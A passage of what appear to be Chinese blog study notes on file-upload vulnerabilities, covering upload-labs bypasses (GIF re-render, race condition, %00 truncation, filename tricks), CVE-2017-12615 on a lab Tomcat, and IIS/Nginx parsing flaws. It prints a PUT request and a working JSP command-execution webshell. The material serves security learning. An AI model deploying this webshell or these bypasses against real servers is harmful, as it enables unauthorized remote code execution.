$is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg = &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg = &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg = &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="上传gif"><a href="#上传gif" class="headerlink" title="上传gif"></a>上传gif</h4><p>将<code>&lt;?php phpinfo(); ?&gt;</code>添加到111.gif的尾部.</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112272.png" alt="image-20210904165301773"></p><p>成功上传含有一句话的111.gif,但是这并没有成功.我们将上传的图片下载到本地.<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113128.png" alt="image-20210904165313563"></p><p>可以看到下载下来的文件名已经变化,所以这是经过二次渲染的图片.我们使用16进制编辑器将其打开.<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112707.png" alt="image-20210904165322486"></p><p>可以发现,我们在gif末端添加的php代码已经被去除.</p><p>关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.</p><p>经过对比,蓝色部分是没有发生变化的,<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112714.png" alt="image-20210904165333714"></p><p>我们将代码写到该位置.<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113040.png" alt="image-20210904165342772"></p><p>上传后在下载到本地使用16进制编辑器打开<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112188.png" alt="image-20210904165351038"></p><p>可以看到php代码没有被去除.成功上传图片马。</p><h4 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2657#toc-13</span><br></pre></td></tr></table></figure><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-17/index.php</span><br><span class="line">http://127.0.0.1/upload-labs/Pass-18/index.php</span><br></pre></td></tr></table></figure><h4 id="检测代码-1"><a href="#检测代码-1" class="headerlink" title="检测代码"></a>检测代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = $UPLOAD_ADDR . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             unlink($upload_file);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &#x27;上传失败！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是将文件先上传到服务器，再去比较是否符合条件，如果符合就重命名，不符合就删除掉，所以可以用条件竞争，一直给服务器发送数据包，就可以在他删除之前访问到</p><h4 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>通过不停的给服务器发包，上传webshell，让他来不及删除，就可以访问了。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112191.png" alt="image-20210904165853334"></p><h3 id="目录命名-x-php"><a href="#目录命名-x-php" class="headerlink" title="目录命名-x.php/."></a>目录命名-x.php/.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-19/index.php</span><br></pre></td></tr></table></figure><h4 id="检测代码-2"><a href="#检测代码-2" class="headerlink" title="检测代码"></a>检测代码</h4><p>这关文件名可以自己定义，但是有过滤，但是文件名最后会和路径进行拼接，我们可以通过%00绕过，也可以通过<code>x.php/.</code>的方式绕过，这种方式在代码中相当于<code>x.php</code>是目录，点是文件名，最后检测的后缀是<code>php/.</code>但是在windows中<code>x.php/.</code>又会被当作是文件名。所以最后又变成了x.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &#x27;上传失败！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &#x27;禁止保存为该类型文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p><strong>%00截断</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113689.png" alt="image-20210904172510358"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113919.png" alt="image-20210904172542224"></p><p><strong>目录方式绕过</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112674.png" alt="image-20210904172731561"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112033.png" alt="image-20210904172748535"></p><p>脚本函数漏洞-CVE-2015-2348  </p><h3 id="数组接受-目录命名"><a href="#数组接受-目录命名" class="headerlink" title="数组接受+目录命名"></a>数组接受+目录命名</h3><h4 id="检测代码-3"><a href="#检测代码-3" class="headerlink" title="检测代码"></a>检测代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;</span><br><span class="line">    //检查MIME</span><br><span class="line">    $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);</span><br><span class="line">    if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;</span><br><span class="line">        $msg = &quot;禁止上传该类型文件!&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //检查文件名</span><br><span class="line">        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        if (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">        if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = &quot;禁止上传该后缀文件!&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = &quot;文件上传成功！&quot;;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &quot;文件上传失败！&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $msg = &quot;请选择要上传的文件！&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p>关键点在于以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!is_array($file)) &#123;</span><br><span class="line">           $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>如果$file不是数组，就会以.分割被弄成数组,假如图片名为xx.jpg,那么数组就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file=[&#x27;xx&#x27;,&#x27;.&#x27;,&#x27;jpg&#x27;]</span><br></pre></td></tr></table></figure><p>如果我们这样构造:</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113633.png" alt="image-20210904174654450"></p><p>那么执行这个的时候$file就会等于<code>$_POST[&#39;save_name&#39;]</code>，此时$file就是数组了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br></pre></td></tr></table></figure><p>而取后缀就会去到数组的最后一个，也就是jpg，然后就绕过了检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ext = end($file);</span><br></pre></td></tr></table></figure><p>最后拼接名字的时候就是<code>aaaaa.php/</code>了，所有最后文件就是<code>aaaaa.php/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112057.png" alt="image-20210904174216258"></p><h3 id="CVE-2017-12615-上传-Tomcat"><a href="#CVE-2017-12615-上传-Tomcat" class="headerlink" title="CVE-2017-12615-上传-Tomcat"></a>CVE-2017-12615-上传-Tomcat</h3><h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><ul><li><p>漏洞名称：Tomcat任意文件上传漏洞</p></li><li><p>漏洞编号：CVE-2017-12615</p></li><li><p>漏洞影响：上传包含任意代码的文件，并被服务器执行。</p></li><li><p>影响平台：Windows</p></li><li><p>影响版本：Apache Tomcat 7.0.0 - 7.0.81</p></li></ul><h4 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h4><p><strong>开启HTTP PUT</strong></p><p>修改Tomcat 7.0/conf/web.xml文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">漏洞本质Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件：</span><br><span class="line"></span><br><span class="line">​```</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;readonly&lt;/param-name&gt; //这里</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure><p>当然因为是用vulhub搭建的，所有开启环境的时候已经修改过了。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112115.png" alt="image-20210904190223852"></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>这里需要将shell字符串改为jsp后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">直接发送以下数据包即可在Web根目录写入shell：</span><br><span class="line"></span><br><span class="line">​```</span><br><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line">​```</span><br></pre></td></tr></table></figure><p>我这里修改的是shell是</p><p>密码是023，通过i进行传参</p><p>请求：<a href="http://192.168.47.156:8080/1.jsp?pwd=023&amp;i=ls">http://192.168.47.156:8080/1.jsp?pwd=023&amp;i=ls</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">     if ( &quot;023&quot; .equals(request.getParameter( &quot;pwd&quot; )))&#123;</span><br><span class="line">         java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter( &quot;i&quot; )).getInputStream();</span><br><span class="line">         int a = - 1 ;</span><br><span class="line">         byte [] b = new byte [ 2048 ];</span><br><span class="line">         out.print( &quot;&lt;pre&gt;&quot; );</span><br><span class="line">         while ((a=in.read(b))!=- 1 )&#123;</span><br><span class="line">             out.println( new String(b));</span><br><span class="line">         &#125;</span><br><span class="line">         out.print( &quot;&lt;/pre&gt;&quot; );</span><br><span class="line">     &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113683.png" alt="image-20210904191153268"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113932.png" alt="image-20210904191256585"></p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5</span><br><span class="line">https://www.6b8.me/index.php?m=home&amp;c=article&amp;a=index&amp;id=376</span><br></pre></td></tr></table></figure><h3 id="中间件解析漏洞-配合文件上传测试"><a href="#中间件解析漏洞-配合文件上传测试" class="headerlink" title="中间件解析漏洞+配合文件上传测试"></a>中间件解析漏洞+配合文件上传测试</h3><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112536.png" alt="image-20210904175536983"></p><h4 id="IIS-上传-解析-IIS5-x–6-x"><a href="#IIS-上传-解析-IIS5-x–6-x" class="headerlink" title="IIS-上传-解析(IIS5.x–6.x)"></a>IIS-上传-解析(IIS5.x–6.x)</h4><p>如果是以<code>image.asp/qq.jpg</code>上传那么image.asp目录下不管是什么文件都会被就会被当做asp解析，例如这里的qq.jpg，就会被当做asp被解析。<br>如果文件是以<code>image.asp:jpg</code>或<code>xxx.aspx;xxjpg</code>命名被上传，那么此文件会被当做asp执行</p><p>注:asp可以换做php如果换了php那么就当php执行</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113736.png" alt="image-20210904192910333" style="zoom:75%;" /><h4 id="Nginx-上传-解析"><a href="#Nginx-上传-解析" class="headerlink" title="Nginx-上传-解析"></a>Nginx-上传-解析</h4><p>这一漏洞是由于Nginx中php配置不当而造成的，与Nginx版本无关，但在高版本的php中，由于“security.limit_extensions”的引入，使得该漏洞难以被成功利用。</p><p>php.ini文件中cgi.fix_pathinfo的值默认为1，会导致解析漏洞</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112664.png" alt="image-20210904195342399"></p><p>还有一个是空字节代码执行漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞)</span><br></pre></td></tr></table></figure><h4 id="IIS7-5-上传-解析"><a href="#IIS7-5-上传-解析" class="headerlink" title="IIS7.5-上传-解析"></a>IIS7.5-上传-解析</h4><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113578.png" alt="image-20210904200322332" style="zoom:80%;" /><p>php.ini里默认cgi.fix_pathinfo=1，对其进行访问的时候，在URL路径后添加.php后缀名会当做php文件进行解析，漏洞由此产生</p><h4 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/1996-11-01-614lb/p/14237744.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>21WEB漏洞--文件上传之后端黑白名单绕过</title>
      <link href="/2021/09/21/21WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"/>
      <url>/2021/09/21/21WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="文件上传常见验证"><a href="#文件上传常见验证" class="headerlink" title="文件上传常见验证:"></a>文件上传常见验证:</h3><h4 id="后缀名验证"><a href="#后缀名验证" class="headerlink" title="后缀名验证"></a>后缀名验证</h4><h5 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h5><p><strong>检测原理</strong></p><p>文件类型根据黑名单来检测的原理就是：服务器程序根据一份文件后缀名的名单来判断是否允许当前文件上传到服务器，只要上传的文件的类型能够和这个黑名单里面的类型匹配，那么就禁止该文件上传</p><p><strong>明确不让上传的格式后缀</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asp php jsp aspx cgi war 等等</span><br></pre></td></tr></table></figure><h5 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h5><p><strong>检测原理</strong></p><p>明确可以上传的后缀格式，就是说只允许上传明确标注的格式，其他格式不允许上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpg png zip rar gif 等等</span><br></pre></td></tr></table></figure><h4 id="文件类型验证"><a href="#文件类型验证" class="headerlink" title="文件类型验证"></a>文件类型验证</h4><p><strong>检测原理</strong></p><p>当用户上传文件到服务器端的时候，服务器端的程序会获取上传文件的MIME类型，然后用这个获取到的类型来和期望的MIME类型进行匹配，如果匹配不上则说明上传的文件不合法。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110536.png" alt="image-20210902213937940"></p><h4 id="文件头验证"><a href="#文件头验证" class="headerlink" title="文件头验证"></a>文件头验证</h4><p><strong>检测原理</strong></p><p> 文件头检查是指当浏览器上传到服务器的时候，会对文件头检测，符合，则允许上传，否则不允许上传。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111106.png" alt="image-20210902214753267" style="zoom:70%;" /><p><strong>绕过方法</strong></p><p>通过将文件头修改为<code>GIF89a0</code>等一些图片头部的形式进行绕过</p><h3 id="文件类型绕过-以upload靶场为例"><a href="#文件类型绕过-以upload靶场为例" class="headerlink" title="文件类型绕过(以upload靶场为例)"></a>文件类型绕过(以upload靶场为例)</h3><h4 id="文件类型检测-MIME"><a href="#文件类型检测-MIME" class="headerlink" title="文件类型检测(MIME)"></a>文件类型检测(MIME)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-02/index.php</span><br></pre></td></tr></table></figure><p>本关会检测文件类型是不是图片格式，满足才会通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                